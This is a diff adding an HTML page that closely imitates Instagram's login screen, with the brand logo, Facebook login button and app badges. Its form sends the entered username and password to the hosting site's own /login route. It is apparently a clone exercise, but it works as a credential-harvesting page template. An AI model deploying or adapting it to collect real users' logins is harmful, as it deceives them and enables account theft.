@@ -1,0 +1,127 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Bootstrap demo</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM" crossorigin="anonymous">
+  </head>
+  <style>
+
+    body{
+      overflow: hidden;
+    }
+
+     #image-container {
+      position: absolute;
+      left: 24.8%;
+      top: 11%;
+      border-radius: 20px;
+      width: 261px;
+      height: 555px;
+      /* background: black; */
+      overflow: hidden;
+    }
+
+    #image-container img{
+        object-fit: cover;
+        position: absolute;
+        height: 100%;
+        width: 100%;
+        animation: anim 8s cubic-bezier(0.19, 1, 0.22, 1) infinite ;
+    
+    }
+    @keyframes anim{
+        0%{
+            opacity: 1;
+            z-index: 1;
+        }
+        25%{
+            opacity: 1;
+            z-index: 1;
+        }
+        25.1%{
+            opacity: 0;
+            z-index: 0;
+        }
+        50%{
+            opacity: 0;
+            z-index: 0;
+        }
+        75%{
+            opacity: 0;
+            z-index: 0;
+        }
+        100%{
+            opacity: 0;
+            z-index: 0;
+        }
+    
+    }
+    
+    #image-container img:nth-child(2){
+        animation-delay: 2s;
+    
+    }
+    #image-container img:nth-child(3){
+        animation-delay: 4s;
+    
+    }
+    #image-conatiner img:nth-child(4){
+        animation-delay: 6s;
+    }
+    
+
+  </style>
+  <body>
+    <div id="img" style="width: 39vw; height: 100vh; top: 45%; left: 35%; ; position: absolute; transform: translate(-50%,-50%); " >
+      <img style=" margin-top: 15%; width: 80%; height:100%; object-fit: cover;" src="/images/uploads/home-phones.png" alt="">
+    </div>
+
+    <div id="image-container">
+      <img src="/images/screenshot1.png" alt="">
+      <img src="/images/screenshot2.png" alt="">
+      <img src="/images/screenshot3.png" alt="">
+      <img src="/images/screenshot4.png" alt="">
+    </div>
+
+    <div class="container mt-5" style="width: 25vw; top: 32%; left: 60%; position: absolute; transform: translate(-50%,-50%); 
+    border: 1px solid #68686838; padding: 40px;">
+      <form action="/login" method="post" >
+        <div style=" width: 23.5vw; height: 20vh; position: relative; margin-top: -5vh; margin-left: -30px;" id="instalogo">
+          <img style="width: 130%; height: 130%; object-fit: cover; left: 50%; top: 50%; position: absolute;
+          transform: translate(-50%,-50%);" src="/images/uploads/Instagram-Logo-800x450-removebg.png" alt="">
+        </div>
+        <div class="mb-3">
+          <label for="exampleInputEmail1" class="form-label"></label>
+          <input type="text" name="username" style="width: 20vw; height: 5vh; margin-top: -10%; border-radius: 1px; position: absolute; margin-left: -2%;" placeholder="Username" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp">
+          <div id="emailHelp"></div>
+        </div>
+        <div class="mb-3">
+          <label for="exampleInputPassword1" class="form-label"></label>
+          <input style="width: 20vw; height: 5vh; margin-top: -10%; border-radius: 1px; position: absolute; margin-left: -2%;" name="password" type="password" placeholder="Password" class="form-control" id="exampleInputPassword1">
+        </div>
+        <button type="submit" style="width: 20vw; height: 5vh; margin-top: -1%; border-radius: 5px; position: absolute; margin-left: -2%;" class="btn btn-primary">Log in</button>
+
+        <h6 style="margin-top: 20%; margin-left: 13px;">----------------    OR    ----------------</h6>
+        <button class="btn" style="color: #385185; font-weight: 600;"><img style="width: 20px; height: 20px; margin-left: 20px; margin-right: 10px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIIAAACCCAMAAAC93eDPAAAAh1BMVEUAN8H///8AM8D9/v5EUsYLQMQbTMgVR8YRRMUIPcMCOcEAIr4eT8ipsuMYSscnVsoALsDU2fHFx+oAGrza3vJsetG9xem1ueVYYsoAKb8kU8ru7/nR0++PmttYbc5MVccADbvl5/YAALp5gtSlrOEsW8z3+P2Dj9ibo95qddCLk9iAh9VGWcg0kqb2AAAD6klEQVR4nO2b65KiMBCFkRFEYDQD6E4UL6hzcd33f75VByFNOiFQBtjanN8U50u6k3QK2hr1LqtvAIMgR3jRIGWEdbrZ7sZatNtu0nUtQnLx9pTYmkTo3rskUoRscSC2b2mUb5PDIhMjnCjR6p9TEHoSIRwDWz/ATXZwxBEWMf+s7UzCcLVahYXcm0J3lmtSymPl3DR1poJZjRcYwjGuPG5PZ/OPq+alVncBmqsYFIhwx0Ap/PjII5wC6G95c2C/WgF/N+T8Pcz/LgwiOFURMgrz4AYA/EE4GHtu/F7Ff+pfheQDzSoICwLmacUA/Ix+Xp3/mSvxz81//FEEiywgQnJgnrI96B/y8WdzURwACcB1mIcEIFzYSZgJ4g/yj/MvJuC6+1BKg1JxjC52cmER1h7zkCtIQLck4NbhY/g+IfZ0+/X9+ovV8h1jsL01g5Duy8lyPyT+SP45Zf5Z8WwTfY54wUx7RGKfMggbWqDNhPNfF3+LnlPEXohg0Q2DsC0e8eaC+DP5z8//LfVIKAIQIZAtg7B7xMrHN0CFBUjPWASkCPaOQRg/EEJV/+r6C36LAYQI45cC4eWBMEHzX2H904uMoAGCr3IAYRuw5Umi0AjBU45/4f+zAdJISqCO4DPD5/0d8f5L3uUE6giO7AAGC8Av/W97GhUvx4YIM/EJDMbPAOSvkmeCOoIPD4C6+JdbOv2qIVBGcJQqoKp/udc/AcETH8AOzL9KAUD5G1JbBFn8JQWI/acuFZQR0ANYoQAiZ9z3M0lzvW3VEHzxASAtwIrqByod01L4FUmM0MjfKo59qChGB16DoLQAEQXfCMJ7PQGG0Gz+S4RXnmA9Ubie8gi4f/1VG0NI/DYIVvPxSxBU7ugIQt0G0ADhrR1C3Q2sG4QWAM9FaOP/XIQ29s9GaOMvQlDYmfAi/h9DsB9398MJQYgDVorHVFOCcbTMlfEI6yWr6Kx+m2qCUFe4sxoAQoi+v1MEq3eET03p2AAh6x8hxXeJLhGWFH9FhwivAf6KDhG++5+FS/8I+GWqUwS3/0XJf3HqHOGAV0MdIqx1IYzTKFeGuEaMTvi28ISqKc6FVk37uFQgqEqfVjv6/3X5ahAMgkEwCAbBIBgEg2AQDIJBMAgGwSAYBINgEAyCQRguwmgACLt+ENifkAWfTTQjgF+xN/jHI80I4Id09rf8xqKbLKlqqRBZ+Fs+aE5orHs/BJRSKoDmBNii0ZFgiwZsVOlG1UYVwa+hOlVt1+GalrSLb1qqtm5pF9+6hTSw6RTawIa28WkT3sY3hGbGIbR0DqGxdTSA9t6bem9yzqWj01vU6z3ghneD0LH+AlsploN+86m4AAAAAElFTkSuQmCC" alt="">Log in with Facebook</button>
+        <a style="text-decoration: none; position: absolute; white-space: nowrap; bottom: 2%; left: 50%; transform: translate(-50%,0); font-size: 1vw; color: black;" href="">Forgot password?</a>
+      </form>
+      <div id="Sign" style="width: 25vw; height: 10vh; border: 1px solid #68686838 ; margin-top: 15%; margin-left: -41px; position: absolute;">
+        <h5 style="font-size: 1.2vw; display: flex; align-items: center; justify-content: center;margin-top: 20px;">Don't have an account? <a href="/signup" style="text-decoration: none;"> Sign up</a></h5>
+      </div>
+      <div style="width: 25vw; height: 15vh; margin-top: 37%; margin-left: -41px; position: absolute; display: flex; justify-content: center; flex-direction: column; align-items: center;" id="downloads">
+        <h6 style="font-size: 1vw; margin-bottom: 5%;">Get the app</h6>
+        <div id="downloads" style="width: 90%; height: 80%; position: relative; display: flex;
+        align-items: center; justify-content: space-between;">
+        <img style="width: 170px; position: absolute;" src="/images/c5Rp7Ym-Klz.png" alt="">
+        <img style="width: 130px; position: absolute; right: 0%;" src="/images/EHY6QnZYdNX.png" alt="">
+      </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.4.0/axios.min.js" integrity="sha512-uMtXmF28A2Ab/JJO2t/vYhlaa/3ahUOgj1Zf27M5rOo8/+fcTUVH0/E0ll68njmjrLqOBjXM3V9NiPFL5ywWPQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script>
+
+    </script>
+  </body>
+</html>
